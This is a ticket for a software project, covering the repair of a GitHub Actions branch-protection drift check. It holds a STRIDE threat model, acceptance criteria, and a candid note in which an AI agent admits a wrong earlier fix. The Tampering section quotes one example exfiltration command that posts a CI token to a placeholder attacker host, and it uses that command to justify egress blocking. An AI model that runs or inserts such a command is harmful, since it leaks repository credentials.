# 158 — branch-protection drift: real permission fix (PR #311 follow-on)

**Cluster:** infra · CI
**Estimate:** 0.5d
**Type:** JUDGMENT

## Narrative

PR #311 attempted a one-line fix to the slice-127 `branch-protection-drift` CI job — adding `administration: read` to the job's `permissions:` block, on the theory that `GITHUB_TOKEN` was missing the scope needed to call `gh api repos/.../branches/main/protection/required_status_checks`. That fix was wrong on two counts and was closed:

1. **`administration` is not a valid `GITHUB_TOKEN` permission scope.** `actionlint` flags the unknown scope and GHA rejects the entire workflow file on parse. Valid scopes are `actions`, `artifact-metadata`, `attestations`, `checks`, `contents`, `deployments`, `discussions`, `id-token`, `issues`, `models`, `packages`, `pages`, `pull-requests`, `repository-projects`, `security-events`, `statuses` (per actionlint 1.7.12 + GHA docs). There is no `administration` scope grantable via the workflow `permissions:` block.
2. **Even if it existed, `GITHUB_TOKEN` can't grant repo-administration scope.** The branch-protection API requires `Administration: Read`, which is a repo-permission level only available on fine-grained PATs or GitHub Apps installed with that permission — not on the per-run-issued `GITHUB_TOKEN`.

The PR #311 invalid workflow file was the actual reason CI did not fire on PR creation: GHA silently dropped pull_request runs of the main `CI` workflow because the file was schema-invalid. The push-on-main "0s failure" pattern observed since slices 147 + 148 merged was a symptom of GHA failing to load the same broken file from main — wait, that's incorrect — the broken file was only on the #311 branch, so the push-on-main pattern is a separate puzzle and is OUT OF SCOPE for this slice.

The real fix needs to do three things:

1. Pick an auth approach that actually grants `Administration: Read` to the drift-check step.
2. Stop the misleading sticky comment from continuing to surface every CI run on every PR.
3. Add an `actionlint` step (or pre-commit hook) so the next contributor who adds an invalid permission scope gets caught at PR time instead of in production.

## Threat model

### S — Spoofing

- **NEW THREAT:** A repo-scoped `Administration: Read` PAT in `secrets.BRANCH_PROTECTION_READ_TOKEN` is a credential that can read the entire ruleset configuration. If leaked, an attacker can map our enforcement surface (which checks are gated, which aren't) to plan a payload that slips through.
- **MITIGATION:** Fine-grained PAT, not classic; scoped to **this repo only**; `Administration: Read` and `Contents: Read` ONLY (no write); 90-day expiry; documented rotation cadence; audit-log alert on usage from any runner IP outside GHA's IP range. (D1 JUDGMENT: PAT vs. GitHub App — see D-block below.)
- **ALT MITIGATION:** GitHub App with the same permissions, installed only on this repo. Slightly higher operational overhead; token minted per-run via `actions/create-github-app-token` (SHA-pinned), no long-lived secret in the repo.

### T — Tampering

- A PR can modify the `branch-protection-drift` job to exfiltrate the token (e.g., `run: curl attacker.com -d "$GH_TOKEN"`). Same risk profile as any `GITHUB_TOKEN`-using job, but the elevated token makes the impact worse.
- **MITIGATION:** Step-Security `harden-runner` (already in use repo-wide per slice 117) with `egress-policy: block` on this specific step + per-step `env:` scoping (PAT only exposed to the one step that calls `gh api`, not the rest of the job).

### R — Repudiation

- The branch-protection-drift script runs in CI on every PR + every push to main. If a malicious PR uses the elevated token, the audit trail needs to be clear.
- **MITIGATION:** Token usage shows up in GitHub's audit log under the bot/app account. Add `actor: ${{ github.actor }}` to the `gh api` call's user-agent so the log entry says which PR triggered the call.

### I — Information disclosure

- **CONFIRMED PRESENT TODAY:** The misleading "Script error... missing tooling OR malformed JSON" sticky comment surfaces on every PR for users who don't have admin access to debug. The comment is wrong but not sensitive — it just trains contributors to ignore the check.
- **MITIGATION:** Sticky comment updated to surface the actual diagnostic ("Branch-protection drift check is not configured — see slice 158"), OR the job is disabled (commented-out / `if: false`) until the proper fix lands.

### D — Denial of service

- The drift-check script makes one `gh api` call per run. Bounded; not a DoS surface.

### E — Elevation of privilege

- **CRITICAL:** Granting `Administration: Read` to a CI step that runs on every PR — including from forks (hypothetically; this repo doesn't accept fork PRs today per CONTRIBUTING.md, but the trigger is `pull_request:` not `pull_request_target:`) — is the elevation surface.
- **MITIGATION:** `pull_request:` events use the PR-branch workflow file. A malicious PR could modify the workflow to leak the secret. Add an explicit gate: `if: github.event_name == 'push' || github.actor == 'mgoodric'` so the elevated step runs only on push-to-main and on author-confirmed PRs.
- **ALT MITIGATION:** Move the drift-check entirely to a `push: branches: [main]` workflow so PR-time elevation goes away. PR-time check becomes file-only (validate JSON shape, don't compare to live).

## Acceptance criteria

### Backend (script + workflow)

- AC-1: `scripts/check-branch-protection-drift.sh` runs cleanly against a real `Administration: Read` token (either PAT secret or App token) and exits 0/1 correctly.
- AC-2: Pre-commit hook OR CI step runs `actionlint` against `.github/workflows/*.yml` on every PR. Invalid permission scopes fail the PR before merge.
- AC-3: `.github/workflows/ci.yml::branch-protection-drift` job no longer emits the misleading "Script error... missing tooling OR malformed JSON" sticky comment text. Either it actually succeeds (with the proper token) or it's gated to push-on-main only.
- AC-4: The job's `permissions:` block contains ONLY valid scopes (re-validated by actionlint added in AC-2).

### Tests

- AC-5: actionlint installed in pre-commit OR CI; running it against the current workflow produces zero `unknown permission scope` errors.
- AC-6: A test fixture workflow with `permissions: { foo: read }` (invalid) is caught by the new actionlint gate.
- AC-7: `scripts/check-branch-protection-drift.sh` integration test (existing) still passes with the new auth path.

### Docs

- AC-8: `scripts/check-branch-protection-drift.sh` header comments updated to reference the new auth path (PAT secret name OR GitHub App ID).
- AC-9: `CONTRIBUTING.md` (or similar) documents the actionlint pre-commit hook + how to handle "unknown permission scope" errors.
- AC-10: A short ADR entry in `docs/adr/` documents the JUDGMENT call (PAT vs. App) + why elevated-token CI is gated.

## Constitutional invariants honored

- **Auth boundary at edges, not application code** — elevated permissions live in a secret, not in application code or shared roles.
- **Minimum-privilege principle** — PAT/App scoped to `Administration: Read` only; not `Write`.
- **No silent failures** — invalid workflow files now fail at PR time (actionlint), not silently in production.

## Canvas references

- `Plans/canvas/09-tech-stack.md` — CI = GitHub Actions
- Slice 127 — the original branch-protection-drift job (this slice repairs its broken auth path)
- Slice 117 — Step-Security `harden-runner` integration (reuse for `egress-policy: block` on the elevated step)

## Dependencies

- #127 (merged) — original branch-protection-drift job
- #117 (merged) — Step-Security harden-runner

## Anti-criteria (P0 — block merge)

- **DOES NOT** add `administration` to any `permissions:` block in any workflow. The scope does not exist.
- **DOES NOT** grant `Administration: Write` to any CI token. Read-only is sufficient and required.
- **DOES NOT** leave the elevated PAT/App token exposed to every step in the job. Token must be `env:`-scoped to the one step that needs it.
- **DOES NOT** trigger the elevated drift-check on `pull_request:` from forks. Either gate to push-on-main or use `pull_request_target` with author-allowlist.
- **DOES NOT** keep the misleading "Script error... missing tooling OR malformed JSON" sticky comment text in any code path. Either remove the comment or rewrite it with the real diagnostic.
- **DOES NOT** skip actionlint validation. Whatever auth path is chosen, the workflow file must pass actionlint at PR time.

## Skill mix (3-5)

- Engineer (implementation)
- Security (PAT-scope vs App-permissions threat model deep-dive)
- grill-me (D1 JUDGMENT pressure-test: PAT vs App)
- Plan (decompose the AC-2 actionlint integration: pre-commit vs CI vs both)

## Notes for the implementing agent

**D1 JUDGMENT at pickup:** PAT vs GitHub App. PAT is simpler (one secret in repo), App is more auditable (per-install token, mintable per-run). Engineer chooses + records in `docs/audit-log/158-branch-protection-drift-real-fix-decisions.md`.

**D2 JUDGMENT at pickup:** PR-time gating. Option (a) push-on-main only (loses PR-time signal), option (b) `if: github.actor in allowlist`, option (c) `pull_request_target` with author validation. Engineer chooses + records.

**D3 JUDGMENT at pickup:** actionlint integration. Option (a) pre-commit hook (catches at commit time, requires contributor install), option (b) CI step in `pre-commit · all hooks` job (catches at PR-open, no contributor install), option (c) both. Engineer chooses + records.

**Provenance:** Surfaced 2026-05-18 during the batch 54 reconcile aftermath when I (Claude Opus 4.7 1M-context) attempted PR #311's wrong fix. The fix was based on a misread of slice 127's failure mode — I assumed the script's exit-2 sticky comment meant the script had run + failed, when in fact the PR-branch workflow file containing my invalid `administration: read` was being rejected by GHA at parse time, the script was never running on the PR branch at all, and the sticky comment on PRs was stale text from previous runs (or from main's broken workflow somehow leaking through — exact mechanism of how the sticky comment surfaces on PRs whose workflow file is GHA-rejected is itself worth a side-investigation in this slice). The actionlint validation gate (AC-2) is the durable fix to prevent the next contributor from making the same mistake.

**Out of scope:** the separate "push-on-main 0s failure" pattern observed at e116b3b → 8df4e40 merges. The workflow file on main was unchanged across those merges, so the push-event failures are NOT caused by the same defect this slice fixes. File as separate spillover slice if pattern recurs.
